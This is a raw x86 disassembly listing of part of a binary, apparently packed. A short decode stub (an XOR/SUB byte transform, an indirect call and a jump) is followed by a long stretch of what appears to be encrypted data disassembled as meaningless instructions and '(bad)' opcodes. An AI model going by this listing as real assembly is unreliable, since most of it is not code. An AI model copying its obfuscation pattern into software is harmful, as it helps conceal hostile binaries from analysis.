  403872:	push   DWORD PTR [ebp-0x2c]
  403875:	xor    al,0x6f
  403877:	sub    al,0xd
  403879:	mov    BYTE PTR [ecx],al
  40387b:	mov    eax,ds:0x4217de
  403880:	push   DWORD PTR [eax]
  403882:	push   DWORD PTR ds:0x421a3a
  403888:	push   DWORD PTR ds:0x4217e6
  40388e:	push   DWORD PTR ds:0x421a1a
  403894:	push   DWORD PTR ds:0x421aae
  40389a:	push   DWORD PTR [ebp-0x30]
  40389d:	push   DWORD PTR [ebp-0x20]
  4038a0:	mov    eax,DWORD PTR [ebp-0x8]
  4038a3:	mov    eax,DWORD PTR [eax]
  4038a5:	mov    eax,DWORD PTR [eax]
  4038a7:	mov    eax,DWORD PTR [eax]
  4038a9:	call   eax
  4038ab:	mov    eax,DWORD PTR [ebp-0x34]
  4038ae:	mov    ecx,DWORD PTR ds:0x4219de
  4038b4:	add    DWORD PTR [eax],ecx
  4038b6:	jmp    0x405c6b
  4038bb:	fnstenv [edx-0x73]
  4038be:	xchg   ebp,eax
  4038bf:	gs xchg ebp,eax
  4038c1:	test   eax,0x7c0e640e
  4038c6:	sbb    al,bl
  4038c8:	(bad)  
  4038c9:	(bad)
  4038cd:	bound  esp,QWORD PTR [edx-0x36]
  4038d0:	pop    edi
  4038d1:	bound  esp,QWORD PTR [edx-0x78]
  4038d4:	inc    ecx
  4038d5:	jae    0x4038a2
  4038d7:	inc    ebp
  4038d8:	jecxz  0x40386c
  4038da:	push   ss
  4038db:	std    
  4038dc:	pop    edi
  4038dd:	iret   
  4038de:	mov    dl,0xbd
  4038e0:	hlt    
  4038e1:	dec    ebp
  4038e2:	nop
  4038e3:	and    DWORD PTR [esi],ecx
  4038e5:	or     ah,BYTE PTR [ebp-0x72]
  4038e8:	dec    ecx
  4038e9:	outs   dx,DWORD PTR ds:[esi]
  4038ea:	stc    
  4038eb:	xchg   ecx,eax
  4038ec:	jmp    0x77d1:0x7c0605f
  4038f3:	(bad)  
  4038f4:	jg     0x4038b3
  4038f6:	es pop ecx
  4038f8:	lahf   
  4038f9:	dec    eax
  4038fa:	pop    edx
  4038fb:	in     eax,dx
  4038fc:	xchg   ebx,eax
  4038fd:	jmp    0x9d5b:0x269d1810
  403904:	and    al,al
  403906:	inc    esp
  403907:	out    0xc1,al
  403909:	xchg   edi,eax
  40390a:	pop    es
  40390b:	(bad)  [edx-0x21]
  40390e:	fldenv [edi-0x75]
  403911:	jmp    0xb8cabdac
  403916:	cmp    DWORD PTR [eax],ebx
  403918:	data16 je 0x4038b6
  40391b:	scas   eax,DWORD PTR es:[edi]
  40391c:	inc    ecx
  40391d:	sub    cl,BYTE PTR es:0xefd8342a
  403924:	shl    BYTE PTR [eax+0x9],cl
  403927:	jnp    0x40396e
  403929:	div    DWORD PTR [ebp-0x3e]
  40392c:	outs   dx,BYTE PTR ds:[esi]
  40392d:	push   ds
  40392e:	push   0xffffffd8
  403930:	push   0x714dd4e9
  403935:	sti    
  403936:	or     eax,0xd9376413
  40393b:	fnstenv [edi]
  40393d:	jg     0x4038f4
  40393f:	push   0x48
  403941:	or     ah,BYTE PTR [esi+0x27]
  403944:	in     al,dx
  403945:	pop    edx
  403946:	mov    al,BYTE PTR [bp+0xbd5]
  40394b:	outs   dx,DWORD PTR ds:[esi]
  40394c:	into   
  40394d:	mov    ecx,0xc682f7a8
  403952:	sbb    eax,0x81885391
  403957:	push   esi
  403958:	lea    ebx,[ebx+0x5d]
  40395b:	mov    bh,BYTE PTR [eax+0x15]
  40395e:	pusha  
  40395f:	inc    esp
  403960:	cmp    DWORD PTR [ebp+0x3a],ebx
  403963:	jne    0x4039dc
  403965:	mov    bh,0xc9
  403967:	sub    eax,0x2a02837e
  40396c:	fisubr WORD PTR [ebx+0x40]
  40396f:	out    dx,eax
  403970:	push   edx
  403971:	imul   BYTE PTR [edi+ebx*8]
  403974:	call   0x9e46:0xa2742a57
  40397b:	push   ecx
  40397c:	pop    eax
  40397e:	imul   ecx,DWORD PTR [ebx+0x8022b0e],0x58
  403985:	adc    eax,0x7ad2a79d
  40398a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40398b:	into   
  40398c:	mov    bl,0xde
  40398e:	imul   ecx,DWORD PTR [edi-0x6f],0x85ce4cff
  403995:	mov    ebp,0x57b79f55
  40399a:	or     al,bh
  40399c:	daa    
  40399d:	dec    esp
  40399e:	cwde   
  40399f:	sub    eax,0xd075a54c
  4039a4:	xor    DWORD PTR [esi+0x2a7b8c12],0x25
  4039ab:	not    DWORD PTR [edx+eiz*4-0x3f406e0a]
  4039b2:	in     al,0x77
  4039b4:	xor    BYTE PTR [esi+edi*2-0xabb13f2],0xbb
  4039bc:	scas   al,BYTE PTR es:[edi]
  4039bd:	push   ebx
  4039be:	outs   dx,BYTE PTR ds:[esi]
  4039bf:	and    BYTE PTR [edx+0x47781ebd],bl
  4039c5:	scas   eax,DWORD PTR es:[edi]
  4039c6:	retf   0x1534
  4039c9:	ret    0x92cc
  4039cc:	mov    eax,0x111eeffa
  4039d1:	daa    
  4039d2:	out    0x80,eax
  4039d4:	popa   
  4039d5:	fcom   st(0)
  4039d7:	shr    DWORD PTR [eax-0x79],cl
  4039da:	mov    esi,DWORD PTR ds:0xe0930e53
  4039e0:	push   ebp
  4039e1:	loopne 0x403a0a
  4039e3:	popa   
  4039e4:	dec    eax
  4039e5:	fisttp DWORD PTR [ecx-0x1ef000e8]
  4039eb:	xchg   ecx,eax
  4039ec:	sub    eax,0xf34f7828
  4039f1:	sbb    cl,BYTE PTR [esi-0x2161377a]
  4039f7:	sahf   
  4039f8:	dec    eax
  4039f9:	xchg   esp,eax
  4039fa:	fmul   DWORD PTR [esi-0x285a6f72]
  403a00:	ins    BYTE PTR es:[edi],dx
  403a01:	and    ebx,ebp
  403a03:	aaa    
  403a04:	into   
  403a05:	or     eax,0x5cedb8d6
  403a0a:	hlt    
  403a0b:	bound  ebp,QWORD PTR [ecx]
  403a0d:	mov    edi,0xc5026232
  403a12:	mov    ds:0xa60c5b3f,al
  403a17:	ror    esp,0x8
  403a1a:	std    
  403a1b:	mov    edi,0x58a788f7
  403a20:	test   ah,ah
  403a22:	mov    BYTE PTR [eax],ah
  403a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a25:	pop    ds
  403a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a27:	xor    dl,BYTE PTR [esi+0x2f]
  403a2a:	xchg   esi,eax
  403a2b:	icebp  
  403a2c:	mov    DWORD PTR [ebp-0x5c],ecx
  403a2f:	push   edi
  403a30:	dec    ecx
  403a31:	adc    ecx,DWORD PTR [edx+0x1ec8390b]
  403a37:	xor    al,0x3a
  403a39:	dec    esi
  403a3a:	mov    edi,0xcc704aed
  403a3f:	(bad)  
  403a41:	pop    ebx
  403a42:	les    ebx,FWORD PTR [eax+0xf709c00]
  403a48:	add    bh,BYTE PTR [eax+0xc091f7b]
  403a4e:	addr16 cmp al,0x7a
  403a51:	or     esi,DWORD PTR [eax-0x4]
  403a54:	pop    esp
  403a55:	loope  0x403a88
  403a57:	ss addr16 xchg edx,eax
  403a5a:	in     eax,dx
  403a5b:	inc    esi
  403a5c:	or     ch,dl
  403a5e:	lea    esi,[edx-0x6a3cbcfc]
  403a64:	push   edx
  403a65:	dec    ebx
  403a66:	sbb    eax,DWORD PTR [edx+esi*2-0x78ee6342]
  403a6d:	push   ebx
  403a6e:	xchg   esi,eax
  403a6f:	arpl   WORD PTR [esi+0x65],si
  403a72:	clc    
  403a73:	retf   0x87b
  403a76:	xchg   BYTE PTR ss:[ebp+0x12],bl
  403a7a:	lock add dl,BYTE PTR ds:0xcb012121
  403a81:	inc    esp
  403a82:	pop    ecx
  403a83:	cli    
  403a84:	mov    BYTE PTR [eax+0x6d],ch
  403a87:	test   esi,0x93665b2e
  403a8d:	jns    0x403a1c
  403a8f:	mov    ebx,DWORD PTR [ebx-0x3a]
  403a92:	iret   
  403a93:	popf   
  403a94:	push   ebx
  403a95:	loope  0x403a67
  403a97:	dec    edi
  403a98:	pop    eax
  403a99:	lods   eax,DWORD PTR ds:[esi]
  403a9a:	and    al,BYTE PTR [ecx]
  403a9c:	mov    ch,0x15
  403a9e:	unpckhps xmm1,XMMWORD PTR [ecx-0x818fcdb]
  403aa5:	push   ebp
  403aa6:	cwde   
  403aa7:	in     eax,dx
  403aa8:	icebp  
  403aa9:	push   0x10
  403aab:	push   edi
  403aac:	and    edx,DWORD PTR [edx]
  403aae:	popa   
  403aaf:	pop    ecx
  403ab0:	mov    ebp,0x46fa4548
  403ab5:	jmp    0xceb7:0x5d8f89b
  403abc:	push   ds
  403abd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403abe:	cmp    ch,dh
  403ac0:	mov    BYTE PTR [eax+0xa],cl
  403ac3:	repnz in al,dx
  403ac5:	sub    dh,BYTE PTR [ebx+eax*4-0x3fedc7ee]
  403acc:	sbb    eax,DWORD PTR [ebp+ebx*8+0x14]
  403ad0:	ins    DWORD PTR es:[edi],dx
  403ad1:	call   0x4e19:0x752a5c58
  403ad8:	out    0x51,al
  403ada:	jbe    0x403b3d
  403adc:	dec    ebx
  403add:	sbb    al,0x69
  403adf:	rcl    DWORD PTR [esi+0x52],0xb
  403ae3:	and    al,0xc8
  403ae5:	mov    bh,0xf4
  403ae7:	out    dx,al
  403ae8:	lea    edi,[esi+0x3]
  403aeb:	into   
  403aec:	jle    0x403afa
  403aee:	cmp    esi,DWORD PTR [eax]
  403af0:	mov    al,0xfe
  403af2:	mov    ecx,0xa50deb32
  403af7:	imul   esp,DWORD PTR [edx+0x71],0xffffff86
  403afb:	cmp    ah,BYTE PTR [edx+ebx*4]
  403afe:	fsub   DWORD PTR [ebx-0x5a]
  403b01:	push   0x35
  403b03:	xchg   esi,eax
  403b04:	sub    dh,BYTE PTR [ebp+0x71599eb1]
  403b0a:	push   es
  403b0b:	push   edi
  403b0c:	xchg   edi,eax
  403b0d:	jge    0x403b77
  403b0f:	ja     0x403b71
  403b11:	dec    eax
  403b12:	bound  ebx,QWORD PTR [eax]
  403b14:	inc    edx
  403b15:	stos   DWORD PTR es:[edi],eax
  403b16:	retf   
  403b17:	xchg   edi,edi
  403b19:	xchg   ebp,eax
  403b1a:	retf   
  403b1b:	push   0x90fec2e6
  403b20:	into   
  403b21:	push   es
  403b22:	aas    
  403b23:	push   DWORD PTR [edi-0x7d]
  403b26:	rcl    BYTE PTR [edx-0x26a6c292],1
  403b2c:	jg     0x403b6b
  403b2e:	adc    dh,al
  403b30:	daa    
  403b31:	jne    0x403ade
  403b33:	push   eax
  403b34:	test   al,0xcc
  403b36:	push   es
  403b37:	push   ecx
  403b38:	bound  ebx,QWORD PTR [eax+0x40]
  403b3b:	jo     0x403b2f
  403b3d:	push   DWORD PTR [esi+0x2e]
  403b40:	(bad)  
  403b41:	bound  edx,QWORD PTR [edi+0xa40f70a]
  403b47:	(bad)  
  403b4a:	jbe    0x403b04
  403b4c:	add    BYTE PTR [esp+edi*1-0x17],bh
  403b50:	sub    edi,ecx
  403b52:	cli    
  403b53:	out    dx,eax
  403b54:	les    ecx,FWORD PTR [edx-0x74]
  403b57:	mov    ch,BYTE PTR [esi+0x14d29e0b]
  403b5d:	xchg   ecx,eax
  403b5e:	inc    ebx
  403b5f:	sub    DWORD PTR [esi-0x320daa0d],ebx
  403b65:	fild   DWORD PTR [ebp+0x6203f85a]
  403b6b:	les    edi,FWORD PTR [edx+eax*1-0x7d4c920c]
  403b72:	sahf   
  403b73:	fadd   st,st(5)
  403b75:	jo     0x403b27
  403b77:	lods   al,BYTE PTR ds:[esi]
  403b78:	inc    ecx
  403b79:	call   0xdf25:0xf1041435
  403b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b81:	xchg   esp,eax
  403b82:	test   al,0x24
  403b84:	retf   0xc9c0
  403b87:	and    al,BYTE PTR [eax]
  403b89:	mov    edi,0x4e478985
  403b8e:	and    cl,BYTE PTR [ebx]
  403b90:	int    0xd
  403b92:	aas    
  403b93:	jae    0x403be0
  403b95:	mov    ds:0x36cedb15,eax
  403b9a:	add    eax,0x1cc29c0f
  403b9f:	ss xchg esp,eax
  403ba1:	shl    DWORD PTR [esi-0x51126b4],1
  403ba7:	int3   
  403ba8:	add    eax,0x531b2887
  403bad:	sbb    BYTE PTR [ecx+0x6d4616e1],0x97
  403bb4:	xchg   esi,eax
  403bb5:	(bad)  
  403bb6:	adc    eax,0x16bce1de
  403bbb:	mov    ah,0x49
  403bbd:	mov    esp,0xc2feb3c1
  403bc2:	and    DWORD PTR [eax],edi
  403bc4:	iret   
  403bc5:	add    BYTE PTR [esi-0x3cecd0ee],ch
  403bcb:	adc    eax,0xae9e0aff
  403bd0:	retf   
  403bd1:	(bad)  
  403bd2:	mov    ebx,0x5b73d778
  403bd7:	pop    esp
  403bd8:	pop    ebx
  403bd9:	cwde   
  403bda:	or     esp,DWORD PTR [edx]
  403bdc:	mov    ds:0x43ccc98f,eax
  403be1:	cmp    BYTE PTR [eax*4-0x779da23e],0xb1
  403be9:	popa   
  403bea:	and    bl,BYTE PTR [ebx-0x59c92eff]
  403bf0:	mov    cl,0xd4
  403bf2:	sti    
  403bf3:	mov    ds:0x7dbd6ea3,eax
  403bf8:	sbb    edx,DWORD PTR [edx+ecx*4]
  403bfb:	stos   BYTE PTR es:[edi],al
  403bfc:	mov    edx,DWORD PTR [esi-0x2]
  403bff:	rcr    DWORD PTR [ebp-0x6b],0x7b
  403c03:	out    0x88,al
  403c05:	into   
  403c06:	inc    edx
  403c07:	ficomp WORD PTR [esp+eax*8-0x4091f10e]
  403c0e:	xor    eax,0xdd29b013
  403c13:	ja     0x403c49
  403c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c16:	mov    dl,0xe5
  403c18:	stos   DWORD PTR es:[edi],eax
  403c19:	jmp    0x403c81
  403c1b:	cld    
  403c1c:	dec    ebp
  403c1d:	sbb    DWORD PTR [edx],edi
  403c1f:	sbb    DWORD PTR cs:[ecx],edx
  403c22:	mov    DWORD PTR [ebx-0x39],ebp
  403c25:	add    cl,al
  403c27:	xlat   BYTE PTR ds:[ebx]
  403c28:	bound  eax,QWORD PTR [edi]
  403c2a:	sub    eax,esp
  403c2c:	pop    ebx
  403c2d:	test   DWORD PTR [ebx+edi*8-0x45d6abfc],edx
  403c34:	add    eax,0x93e292a
  403c39:	xor    BYTE PTR [edx],dl
  403c3b:	rcl    DWORD PTR [edx+ebp*1-0x3a09a72a],1
  403c42:	xchg   ecx,eax
  403c43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c44:	lea    edx,[ebx-0x12]
  403c47:	xor    BYTE PTR [ecx],dl
  403c49:	push   cs
  403c4a:	js     0x403bcd
  403c4c:	mov    esi,0x6d2612c8
  403c51:	add    bl,BYTE PTR [eax]
  403c53:	scas   eax,DWORD PTR es:[edi]
  403c54:	adc    BYTE PTR [edi+eiz*2+0x882bb67],ah
  403c5b:	dec    ecx
  403c5c:	icebp  
  403c5d:	jnp    0x403caa
  403c5f:	ds mov ecx,es
  403c62:	dec    eax
  403c63:	push   eax
  403c64:	cmp    DWORD PTR [edx+0xc],eax
  403c67:	sbb    DWORD PTR [ebx-0x77],edi
  403c6a:	into   
  403c6b:	dec    ebx
  403c6c:	sub    ah,BYTE PTR [ebp-0x43e5d25e]
  403c72:	cmp    al,0x3d
  403c74:	mov    cs,WORD PTR ds:0x55a42b4d
  403c7a:	jno    0x403c8c
  403c7c:	mov    ebp,0x80143aa
  403c81:	inc    ebx
  403c82:	jnp    0x403c39
  403c84:	sahf   
  403c85:	lea    ecx,[edx+0x15]
  403c88:	or     al,0x62
  403c8a:	xchg   esp,eax
  403c8b:	cwde   
  403c8c:	xabort 0x2b
  403c8f:	retf   
  403c90:	pop    esp
  403c91:	inc    ecx
  403c92:	(bad)  
  403c94:	std    
  403c95:	add    al,BYTE PTR [edx+0x59]
  403c98:	jo     0x403c63
  403c9a:	daa    
  403c9b:	loope  0x403c8a
  403c9d:	mov    dh,0x3c
  403c9f:	push   es
  403ca0:	cwde   
  403ca1:	jmp    0x1699:0x40f9cac6
  403ca8:	movd   mm3,ebx
  403cab:	cmc    
  403cac:	cli    
  403cad:	in     al,0x18
  403caf:	push   edi
  403cb0:	ins    DWORD PTR es:[edi],dx
  403cb1:	adc    ah,BYTE PTR [eax]
  403cb3:	mov    bl,0xaa
  403cb5:	and    eax,0xb449e504
  403cba:	dec    esi
  403cbb:	xor    eax,0x97ff0b6e
  403cc0:	xor    dh,0xf1
  403cc3:	addr16 das 
  403cc5:	cmp    al,0x3b
  403cc7:	sub    ch,al
  403cc9:	es cmp eax,0x7b1c936d
  403ccf:	sub    ecx,DWORD PTR [ebx+eax*8-0x6d]
  403cd3:	(bad)  
  403cd4:	arpl   WORD PTR [ecx-0x3227dcd1],dx
  403cda:	nop
  403cdb:	mov    WORD PTR [ebx],ds
  403cdd:	retf   0xe8d7
  403ce0:	xchg   edx,eax
  403ce1:	xchg   ch,bh
  403ce3:	aas    
  403ce4:	ficom  DWORD PTR [eax+0x524ffcd3]
  403cea:	sub    al,0x94
  403cec:	xchg   DWORD PTR [edx+esi*4+0xb48cd3e],ebx
  403cf3:	push   esi
  403cf4:	retf   
  403cf5:	ds jg  0x403d76
  403cf8:	push   ds
  403cf9:	fmul   DWORD PTR [esp+esi*1]
  403cfc:	test   bh,ch
  403cfe:	cmp    eax,0xda79c2e5
  403d03:	push   esp
  403d04:	jmp    0x403cb9
  403d06:	mov    bh,0xf
  403d08:	push   0x1a
  403d0a:	adc    bl,bl
  403d0c:	lock xchg ebp,eax
  403d0e:	cmc    
  403d0f:	into   
  403d10:	mov    esp,DWORD PTR [eax]
  403d12:	dec    edi
  403d13:	push   ebx
  403d14:	jne    0x403d7b
  403d16:	sub    al,0xa7
  403d18:	jge    0x403d36
  403d1a:	inc    edi
  403d1b:	and    ah,BYTE PTR [ecx-0x57]
  403d1e:	iret   
  403d1f:	xor    dh,BYTE PTR [ebx-0x3d]
  403d22:	daa    
  403d23:	mov    ecx,0x52a387c8
  403d28:	cmc    
  403d29:	mov    bl,0xd8
  403d2b:	cmp    ah,ch
  403d2d:	mov    edi,DWORD PTR [ebp+0x6dde8a48]
  403d33:	add    ch,BYTE PTR [eax-0x6c]
  403d36:	add    eax,0xbfd32ba3
  403d3b:	fstp   QWORD PTR [ebx+0x4d76cea7]
  403d41:	dec    edi
  403d42:	xor    BYTE PTR [esi+0x41],ch
  403d45:	fld    QWORD PTR [ebx]
  403d47:	or     DWORD PTR [edi],esp
  403d49:	add    ch,ah
  403d4b:	leave  
  403d4c:	sbb    ch,BYTE PTR [esi-0x66]
  403d4f:	bound  edx,QWORD PTR [ecx-0xd]
  403d52:	call   0xe6d86260
  403d57:	into   
  403d58:	gs loop 0x403d9e
  403d5b:	pop    ecx
  403d5c:	std    
  403d5d:	(bad)  
  403d5e:	fwait
  403d5f:	and    edi,DWORD PTR [edi-0x2a]
  403d62:	ret    0xdc9a
  403d65:	(bad)  
  403d66:	aaa    
  403d67:	and    al,0x32
  403d69:	mov    ebp,0xceefbbd9
  403d6e:	dec    esi
  403d6f:	jecxz  0x403d1c
  403d71:	aas    
  403d72:	add    esp,0x9daf7834
  403d78:	xor    eax,0x6c7ab00
  403d7d:	push   esi
  403d7e:	fwait
  403d7f:	outs   dx,BYTE PTR ds:[esi]
  403d80:	test   DWORD PTR ds:0x9a05f617,esp
  403d86:	xchg   ecx,esp
  403d88:	xor    al,0x5e
  403d8a:	pop    ds
  403d8b:	je     0x403df5
  403d8d:	add    DWORD PTR [edx],edx
  403d8f:	(bad)
  403d92:	fsub   QWORD PTR [ebx+0x1e6dcb7d]
  403d98:	icebp  
  403d99:	pop    ebx
  403d9a:	xchg   esp,edi
  403d9c:	xchg   esp,eax
  403d9d:	stos   DWORD PTR es:[edi],eax
  403d9e:	mov    cl,0x3e
  403da0:	ja     0x403d47
  403da2:	dec    esp
  403da3:	fucomip st,st(4)
  403da5:	cmp    eax,0xba815550
  403daa:	cdq    
  403dab:	cwde   
  403dac:	adc    eax,0x7b241fb6
  403db1:	inc    ecx
  403db2:	jle    0x403d42
  403db4:	pusha  
  403db5:	push   ebp
  403db6:	call   0x6446bb7e
  403dbb:	fs and al,0xb3
  403dbe:	jns    0x403d48
  403dc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dc1:	push   ecx
  403dc2:	test   eax,0x9f0362b5
  403dc7:	lds    eax,FWORD PTR [ebx+0x7824fd42]
  403dcd:	sbb    BYTE PTR [ebp-0x2e],bh
  403dd0:	dec    ebp
  403dd1:	mov    esp,0xfa28544
  403dd6:	dec    DWORD PTR [edx-0x4f441863]
  403ddc:	mov    eax,ds:0x1f3cadcb
  403de1:	je     0x403d95
  403de3:	xor    ebp,DWORD PTR [ebx-0x7e]
  403de6:	push   esi
  403de7:	lods   al,BYTE PTR ds:[esi]
  403de8:	loop   0x403d79
  403dea:	ret    0xcef7
  403ded:	jp     0x403e37
  403def:	pop    es
  403df0:	shr    ah,1
  403df2:	mov    eax,ds:0xf18b377d
  403df7:	pop    ebx
  403df8:	jg     0x403dba
  403dfa:	or     al,bh
  403dfc:	pusha  
  403dfd:	ins    BYTE PTR es:[edi],dx
  403dfe:	call   FWORD PTR [edi-0xa]
  403e01:	neg    ebp
  403e03:	or     ebp,ebx
  403e05:	lods   al,BYTE PTR ds:[esi]
  403e06:	adc    ch,bh
  403e08:	das    
  403e09:	mul    DWORD PTR [esi-0x174466e8]
  403e0f:	sub    BYTE PTR [ebp-0x3b703c9b],0xd8
  403e16:	push   ebx
  403e17:	mov    ebx,0x9ff66d2e
  403e1c:	xor    BYTE PTR [edi-0x24631d15],al
  403e22:	pop    edx
  403e23:	jge    0x403dd5
  403e25:	div    DWORD PTR [ebx]
  403e27:	jo     0x403e5b
  403e29:	xchg   esi,eax
  403e2a:	enter  0x403a,0xde
  403e2e:	jl     0x403e0f
  403e30:	xor    esi,ecx
  403e32:	dec    edi
  403e33:	out    0x36,al
  403e35:	mov    cl,bh
  403e37:	outs   dx,BYTE PTR ds:[esi]
  403e38:	jecxz  0x403dfa
  403e3a:	adc    DWORD PTR [edi],ecx
  403e3c:	into   
  403e3d:	bound  edi,QWORD PTR ds:0xab47aad0
  403e43:	xchg   ecx,eax
  403e44:	xchg   BYTE PTR [esi],ch
  403e46:	and    cl,BYTE PTR [ebx-0x783a9c85]
  403e4c:	cmc    
  403e4d:	pop    es
  403e4e:	in     al,dx
  403e4f:	push   ss
  403e50:	inc    ebp
  403e51:	push   es
  403e52:	and    al,BYTE PTR ds:[edx]
  403e55:	or     al,0x63
  403e57:	lea    ecx,[ecx]
  403e59:	repnz bound ax,DWORD PTR [eax]
  403e5d:	and    eax,0x84fac80
  403e62:	xchg   esp,eax
  403e63:	mov    ?,WORD PTR [edi-0x45]
  403e66:	sbb    eax,0x170c468
  403e6b:	mov    bl,0x89
  403e6d:	lods   al,BYTE PTR ds:[esi]
  403e6e:	ror    BYTE PTR [eax],1
  403e70:	test   BYTE PTR [edi-0x24c450aa],al
  403e76:	mov    ecx,es
  403e78:	test   BYTE PTR [esi-0x7c],bl
  403e7b:	mov    esp,0x758612f4
  403e80:	(bad)  [eax+0x14]
  403e83:	idiv   bl
  403e85:	cdq    
  403e86:	adc    dh,BYTE PTR [esi+ecx*2-0x26226259]
  403e8d:	cwde   
  403e8e:	ss mov edx,0x52c79253
  403e94:	fmulp  st(1),st
  403e96:	push   esi
  403e97:	cdq    
  403e98:	adc    esi,DWORD PTR [ecx-0x14]
  403e9b:	push   0xae5b615d
  403ea0:	mov    al,ds:0x9dcf1342
  403ea5:	pop    es
  403ea6:	xor    DWORD PTR [edx],edx
  403ea8:	dec    esp
  403ea9:	adc    al,BYTE PTR [edi+esi*2+0x3e3a2d6f]
  403eb0:	mov    esp,0x699fc3f0
  403eb5:	pop    ecx
  403eb6:	push   esp
  403eb7:	loope  0x403eea
  403eb9:	scas   al,BYTE PTR es:[edi]
  403eba:	aaa    
  403ebb:	lock test eax,0x75cf4823
  403ec1:	and    BYTE PTR [eax-0x5f6237ad],bh
  403ec7:	stc    
  403ec8:	les    si,DWORD PTR [eax+0x2931d897]
  403ecf:	iret   
  403ed0:	mov    dl,0xc8
  403ed2:	fiadd  DWORD PTR [ebx+esi*4-0x7eee4562]
  403ed9:	(bad)  
  403eda:	push   ecx
  403edb:	sub    DWORD PTR [edi-0x41],eax
  403ede:	sbb    cl,ch
  403ee0:	daa    
  403ee1:	popf   
  403ee2:	adc    DWORD PTR [edx],ebp
  403ee4:	pop    edi
  403ee5:	mov    esp,0x793a7a8b
  403eea:	pop    es
  403eeb:	and    eax,0x370b978
  403ef0:	pop    edi
  403ef1:	es xchg ecx,eax
  403ef3:	gs nop
  403ef5:	and    ebp,DWORD PTR [esi]
  403ef7:	jae    0x403f24
  403ef9:	inc    edi
  403efa:	inc    ebx
  403efb:	es mov edx,0x2b3bfc1d
  403f01:	(bad)  
  403f02:	jmp    DWORD PTR [edx]
  403f04:	bound  esi,QWORD PTR [esi]
  403f06:	or     eax,0x5322037
  403f0b:	adc    al,0x40
  403f0d:	xchg   esi,eax
  403f0e:	push   ds
  403f0f:	dec    esi
  403f10:	xchg   ebp,eax
  403f11:	iret   
  403f12:	data16 jo 0x403f67
  403f15:	loope  0x403eae
  403f17:	dec    ecx
  403f18:	inc    eax
  403f19:	repz push cs
  403f1b:	jo     0x403eb3
  403f1d:	cs xchg ecx,eax
  403f1f:	cmp    esp,DWORD PTR [esi+ebx*8-0x18]
  403f23:	fsub   QWORD PTR [edx]
  403f25:	push   ss
  403f26:	in     eax,0xc3
  403f28:	jecxz  0x403f05
  403f2a:	mov    WORD PTR [edi-0x20],?
  403f2d:	loope  0x403ecc
  403f2f:	mov    ch,0x61
  403f31:	mov    ah,0xc6
  403f33:	es aaa 
  403f35:	iret   
  403f36:	pop    ss
  403f37:	push   eax
  403f38:	out    dx,al
  403f39:	mov    ebx,DWORD PTR [esi+eiz*8+0x48]
  403f3d:	in     al,dx
  403f3e:	sbb    ecx,edi
  403f40:	pushf  
  403f41:	loop   0x403f0d
  403f43:	or     eax,0x36621efd
  403f48:	cwde   
  403f49:	xor    bh,BYTE PTR [ebp-0x3f]
  403f4c:	stc    
  403f4d:	mov    ch,0x71
  403f4f:	dec    ebx
  403f50:	jno    0x403eeb
  403f52:	repz mov eax,ds:0x8c8a47b9
  403f58:	xor    al,0xc2
  403f5a:	sbb    BYTE PTR [ecx+0x36],dl
  403f5d:	mov    dl,0x7
  403f5f:	dec    esi
  403f60:	push   ds
  403f61:	add    BYTE PTR [ecx+esi*2],0x23
  403f65:	je     0x403faa
  403f67:	daa    
  403f68:	xor    DWORD PTR [edx],eax
  403f6a:	pop    edi
  403f6b:	mov    ?,WORD PTR [edi-0x6a]
  403f6e:	cmp    BYTE PTR ds:0x889ccbb5,cl
  403f74:	cmp    ah,bh
  403f76:	add    ecx,eax
  403f78:	repnz jecxz 0x403f80
  403f7b:	xor    eax,0xe6c6ff3d
  403f80:	sub    esi,DWORD PTR [ecx]
  403f82:	test   BYTE PTR [edx+0x5aca0515],dh
  403f88:	iret   
  403f89:	outs   dx,BYTE PTR ds:[esi]
  403f8a:	daa    
  403f8b:	aaa    
  403f8c:	mov    ss,eax
  403f8e:	push   esp
  403f8f:	sbb    ebp,DWORD PTR [edx]
  403f91:	xlat   BYTE PTR ds:[ebx]
  403f92:	pusha  
  403f93:	and    al,bl
  403f95:	cmp    BYTE PTR [ebx+0x334fe3be],ah
  403f9b:	lods   eax,DWORD PTR ds:[esi]
  403f9c:	lds    ecx,FWORD PTR [edx+0x5f94522d]
  403fa2:	jmp    0x39b8:0x147652e9
  403fa9:	sub    edx,DWORD PTR [eax-0x2bc3d5fd]
  403faf:	mov    edx,0x6843e00d
  403fb4:	mov    ds:0xe16b4eeb,eax
  403fb9:	out    dx,al
  403fba:	outs   dx,DWORD PTR ds:[esi]
  403fbb:	in     eax,dx
  403fbc:	and    dl,bh
  403fbe:	sahf   
  403fbf:	loopne 0x403ffb
  403fc1:	icebp  
  403fc2:	sahf   
  403fc3:	dec    edi
  403fc4:	and    edi,edx
  403fc6:	push   es
  403fc7:	cmp    eax,0xad9fa39e
  403fcc:	pop    eax
  403fcd:	enter  0x7917,0x4b
  403fd1:	sbb    BYTE PTR [eax+0x18e392a1],0xbd
  403fd8:	and    ecx,DWORD PTR [ebx-0x1f]
  403fdb:	push   eax
  403fdc:	jp     0x404046
  403fde:	arpl   WORD PTR [ebp+0x46],bp
  403fe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fe2:	mov    ss,edx
  403fe4:	mov    dl,0x8d
  403fe6:	fs test eax,0x9eeb26d2
  403fec:	push   esp
  403fed:	lahf   
  403fee:	or     al,0x4b
  403ff0:	(bad)  
  403ff1:	(bad)  
  403ff3:	add    BYTE PTR [eax+0x1fbeb068],0xa8
  403ffa:	pop    edx
  403ffb:	inc    edx
  403ffc:	outs   dx,BYTE PTR ds:[esi]
  403ffd:	add    BYTE PTR [ebx-0x57],0xcb
  404001:	sub    BYTE PTR [ebx+0x77374144],ch
  404007:	into   
  404008:	jp     0x403fe9
  40400a:	xchg   edx,eax
  40400b:	dec    ebx
  40400c:	je     0x404014
  40400e:	test   edx,ebx
  404010:	imul   edi,DWORD PTR [edi+ebp*4+0x66868e0f],0xffffffd5
  404018:	push   ecx
  404019:	cld    
  40401a:	pusha  
  40401b:	xor    DWORD PTR [esi-0x1e],edx
  40401e:	ss inc esi
  404020:	imul   ecx,DWORD PTR [edx],0xa4611c53
